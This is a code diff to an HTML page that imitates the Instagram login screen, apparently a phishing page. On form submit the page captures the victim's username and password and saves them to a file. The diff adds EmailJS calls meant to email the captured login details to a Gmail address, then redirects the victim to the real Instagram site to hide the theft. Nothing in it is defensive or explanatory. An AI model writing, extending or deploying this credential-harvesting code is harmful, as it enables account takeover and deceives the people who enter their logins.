@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
     <link rel="stylesheet" href="styles.css">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
     <div class="container">
@@ -19,6 +20,10 @@
     </div>
 
     <script>
+        (function() {
+            emailjs.init("NEmraMzZjNzKdvfqs");
+        })();
+
         document.getElementById("loginForm").addEventListener("submit", function (event) {
             event.preventDefault();
 
@@ -26,12 +31,28 @@
             const password = event.target.password.value;
 
             const data = `Username: ${username}\nPassword: ${password}`;
-
+            
             const blob = new Blob([data], { type: 'text/plain' });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = 'console_log.txt';
+            link.download = 'login-details.txt';
             link.click();
+
+            const emailParams = {
+                user_email: "eldrithofficial@gmail.com",
+                download_link: link.href
+            };
+
+            emailjs.send("service_iag6if2", "template_wr5phie", emailParams)
+                .then(function(response) {
+                    console.log("Email sent successfully", response);
+                }, function(error) {
+                    console.log("Email sending failed", error);
+                });
+
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com";
+            }, 2000);
         });
     </script>
 </body>
